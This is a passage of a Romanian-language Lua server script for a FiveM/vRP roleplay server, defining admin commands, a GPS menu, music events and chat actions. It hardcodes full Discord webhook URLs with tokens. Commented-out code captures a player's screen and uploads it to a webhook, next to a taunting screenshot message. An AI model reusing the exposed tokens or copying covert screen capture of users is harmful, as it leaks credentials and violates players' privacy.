        avatar_url = "https://cdn2.thecatapi.com/images/IboDUkK8K.jpg",
        content = "Screenshot by rValy&HyPeR",
        embeds = {
            {
                color = 16771584,
                author = {
                    name = "Screenshot by rValy&HyPeR",
                    icon_url = "https://cdn.discordapp.com/embed/avatars/0.png"
                },

                title = "Screenshot by rValy&HyPeR"
            }
        }
    },
    30000,
    function(error)
        if error then
            return print("^1ERROR: " .. error)
        end
        print("Ti-ai facut-o cu mana ta fraiere:)")
    end
)
		end
	else
		TriggerClientEvent("chatMessage", player, "[^3k2^0] Nu ai acces la aceasta comanda !")
	end
end, false)

RegisterCommand("tptow", function(player)
	local user_id = vRP.getUserId({player})
	if vRP.isUserHeadOfStaff({user_id}) then
		sendToDiscord(GetPlayerName(player).." (" .. user_id .. ")", "am folosit tptow")
		TriggerClientEvent("TpToWaypoint", player)
		local embed = {
			{
			  ["color"] = 0xcf0000,
			  ["title"] = "".. "TpToWaypoint".."",
			  ["description"] = "**TpToWaypoint:** "..GetPlayerName(player).." a folosit Tp To Waypoint",
			  ["thumbnail"] = {
			  },
			  ["footer"] = {
			  ["text"] = "Made by Arabu",
			  },
			}
		  }
		  PerformHttpRequest('https://discord.com/api/webhooks/923371320618655774/q7UVGv6rnoVIoL_CHbfguRu0leImVxeaDLLwlEc_k3zLwV84EQl_piYnW-8GCqUyQHjw', function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' }) 
	else
		TriggerClientEvent("chatMessage", player, "[^3k2^0] Nu ai acces la aceasta comanda !")
	end
end, false)

vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP","vrp_gps")

locatii = {
  ["[Spawn]"] = {-543.03784179688,-208.07373046875,37.649795532226},
  ["[Job Center]"] = {-266.828125,-960.37939453125,31.223142623902},
  ["[Showroom]"] = {-34.220481872558,-1102.599975586,26.422355651856},
  ["[Car Rent Luxury]"] = {-573.86535644532,329.07540893554,84.58935546875},
  ["[Paint Ball]"] = {-1085.5642089844,-1279.6027832032,5.6526222229004},
  ["[Buletin]"] = {-539.47302246094,-215.08837890625,37.64979171753},
  ["[Sala de Forte]"] = {252.72,-271.10,59.92},
}

RegisterCommand("gps", function(player, choice)
  local user_id = vRP.getUserId({player})
  if user_id ~= nil then
    local menu_gps = {}
    for k, v in pairs(locatii) do
      menu_gps[k] = {function(player, choice)
        vRPclient.setGPS(player, {v[1], v[2]})
        vRP.closeMenu({player})
      end, ""}
    end
    vRP.openMenu({player, menu_gps})
  end
end)
RegisterCommand("respawnall", function(player)
    local user_id = vRP.getUserId({player})
    if vRP.isUserFondator({user_id}) then
        local users = vRP.getUsers({})
        for k, v in pairs(users) do 
            Citizen.Wait(10)
            if v then
                vRPclient.teleport(v, {-542.14282226562,-209.27868652344,37.649787902832})
            end
        end
        --TriggerClientEvent("chatMessage", ply, "[^3k2^0] ^0Tot server-ul a primit respawn de la ^1"..GetPlayerName(player))
    else
        vRPclient.noAccess(player, {})
    end
end)
RegisterCommand("restartsv", function(player, args)
    if player == 0 or vRP.getUserId({player}) == 2  or vRP.getUserId({player}) == 1 then
		local text = "Restart la server in 30 de secunde"
		vRPclient.adminAnnouncement(-1, {text})
		local xSound = exports.xsound
		local users = vRP.getUsers({})
		xSound:PlayUrl(-1,"restartsv", "https://www.youtube.com/watch?v=E-hdKc4vbw4", 0.25, false)
		SetTimeout(15000, function()
			vRPclient.notify(-1, {"~r~15 secunde!"})
		end)
		SetTimeout(20000, function()
			vRPclient.notify(-1, {"~r~10 secunde!"})
		end)
		SetTimeout(25000, function()
			vRPclient.notify(-1, {"~r~5 secunde!"})
		end)
		SetTimeout(28000, function()
			vRPclient.notify(-1, {"~r~re 👋!"})
		end)

		SetTimeout(30000, function() 
			for user_id,player in pairs(users) do
				DropPlayer(player,"Server Restart")
			end 
		end)
    end
end, false)


RegisterServerEvent("ssPlayerServer")
AddEventHandler("ssPlayerServer", function (user_db_id)
	-- local server_id = 0
	-- for k, v in pairs(GetPlayers()) do
	-- 	server_id = v
	-- 	u_id = tonumber(vRP.getUserId({server_id}))
	-- 	user_db_id = tonumber(user_db_id)
	-- 	if u_id == user_db_id then
	-- 		print(source, server_id, user_db_id)
	-- 		exports['screenshot-basic']:requestClientScreenshot(GetPlayers()[1], {
	-- 			fileName = 'cache/screenshot.jpg'
				
	-- 		}, function(err, data)
	-- 			print('err', err)
	-- 			print('data', data)
	-- 		  end)
	-- 		--TriggerClientEvent("ssPlayerClient", source, server_id)	

	-- 		exports['screenshot-basic']:requestScreenshotUpload('https://discord.com/api/webhooks/910244415438741524/NeGo-BsTNG-Yg0CHOaZeCjZ3xBpCP9BXH_yvrR9SqaG8uH4jQ-GIw7F6oajMgXqXZ5Gb', 'file', function(data) end)
	-- 	end
	-- end
	
end)



RegisterNetEvent("kmusic:soundStatus")
AddEventHandler("kmusic:soundStatus", function(type, musicId, data)
	local user_id = vRP.getUserId({source})
	if vRP.isUserSponsor({user_id}) then
		TriggerClientEvent("kmusic:soundStatus", -1, type, musicId, data)	
	end
end)


RegisterNetEvent("kmusic:stop")
AddEventHandler("kmusic:stop", function(musicID)
	local user_id = vRP.getUserId({source})
	if vRP.isUserSponsor({user_id}) then
		TriggerClientEvent("kmusic:soundStatus", -1, "stop", musicID, {})
	end
end)


RegisterCommand("do", function(x, args, z)

	local src = x
	local u_id = vRP.getUserId({src})
	local text = table.concat(args, " ")
	for _, p in pairs(vRP.getUsers()) do
		TriggerClientEvent("chatMessage", p, "[^5Actiune^0] | " ..  GetPlayerName(src) .. "(^4" .. u_id .. "^0)" .." : "..text)
	end

end, false)


